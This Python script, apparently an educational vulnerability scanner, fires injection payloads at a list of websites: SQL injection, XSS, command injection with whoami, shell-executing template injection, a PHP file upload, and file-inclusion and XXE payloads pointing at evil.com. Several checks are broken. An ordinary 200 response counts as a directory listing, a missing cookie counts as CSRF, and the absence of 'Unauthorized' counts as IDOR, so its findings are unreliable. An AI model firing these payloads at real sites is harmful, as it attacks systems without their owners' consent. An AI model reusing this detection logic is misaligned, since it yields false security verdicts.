# Tiago Lopes, 2022. tiago.lopes@sou.unifal-mg.edu.br
# This script performs simple security tests on websites searching for common vulnerabilities using the "requests" library.
# This is for educational and personal security purposes and should be used only under previous authorization by the website's owner.

import requests

def check_vulnerabilities(url):

    response = requests.get(url + "/")
    if response.status_code == 200:
        print("Open directory listing vulnerability found: " + url)
    payload = "' OR 1=1 --"
    response = requests.get(url + "/?id=" + payload)
    if payload in response.text:
        print("SQL injection vulnerability found: " + url)
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url + "/?input=" + payload)
    if payload in response.text:
        print("Cross-site scripting (XSS) vulnerability found: " + url)
    payload = "http://evil.com/malicious_script.php"
    response = requests.get(url + "/?file=" + payload)
    if "evil.com" in response.text:
        print("Remote file inclusion vulnerability found: " + url)
    command = "whoami"
    payload = "|{}; echo 'INJECTION'".format(command)
    response = requests.get(url + "/?input=" + payload)
    if "INJECTION" in response.text:
        print("Command injection vulnerability found: " + url)
    payload = "{{7*7}}"
    response = requests.get(url + "/?template=" + payload)
    if "49" in response.text:
        print("Server-side template injection (SSTI) vulnerability found: " + url)
    payload = "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe.dtd'>]><foo>&xxe;</foo>"
    response = requests.post(url + "/xml", data=payload)
    if "evil.com" in response.text:
        print("XML external entity (XXE) vulnerability found: " + url)
    response = requests.get(url)
    if "CSRFToken" not in response.cookies:
        print("Cross-site request forgery (CSRF) vulnerability found: " + url)
    files = {'file': ('malicious_script.php', '<?php echo "Vulnerable"; ?>', 'application/x-php')}
    response = requests.post(url + "/upload", files=files)
    if response.status_code == 200 and "malicious_script.php" in response.text:
        print("File upload vulnerability found: " + url)
    payload = "http://internalserver.com"
    response = requests.get(url + "/?url=" + payload)
    if "internalserver" in response.text:
        print("Server-side request forgery (SSRF) vulnerability found: " + url)
    payload = "echo 'Vulnerable'"
    response = requests.get(url + "/?input=" + payload)
    if "Vulnerable" in response.text:
        print("Remote code execution (RCE) vulnerability found: " + url)
    response = requests.get(url + "/admin")
    if response.status_code == 200 and "Admin Panel" in response.text:
        print("Authentication bypass vulnerability found: " + url)
    payload = "http://internalserver.com"
    response_time = requests.get(url + "/?url=" + payload).elapsed.total_seconds()
    if response_time > 2:
        print("Blind server-side request forgery (SSRF) vulnerability found: " + url)
    payload = "{{7*'7'.__class__.__bases__[0]('echo VULNERABLE', shell=True, executable='/bin/bash')}}"
    response = requests.get(url + "/?template=" + payload)
    if "VULNERABLE" in response.text:
        print("Server-side template injection (SSTI) with remote code execution (RCE) vulnerability found: " + url)
    payload = "'); console.log('VULNERABLE'); //"
    response = requests.get(url + "/?input=" + payload)
    if "VULNERABLE" in response.text:
        print("Server-side JavaScript injection vulnerability found: " + url)
    response = requests.get(url + "/?id=999")
    if "Unauthorized" not in response.text:
        print("Insecure direct object references (IDOR) vulnerability found: " + url)
    payload = "O:10:\"DummyClass\":1:{s:6:\"_data\";s:9:\"VULNERABLE\";}"
    response = requests.post(url + "/deserialize", data=payload)
    if "VULNERABLE" in response.text:
        print("Insecure deserialization vulnerability found: " + url)
    payload = "http://maliciousdomain.com"
    response = requests.get(url + "/?url=" + payload)
    if "maliciousdomain" in response.text:
        print("Server-side request forgery (SSRF) with DNS rebinding vulnerability found: " + url)

websites = ["website1,website2,..."] #list of websites to test.

for website in websites:
    check_vulnerabilities(website)
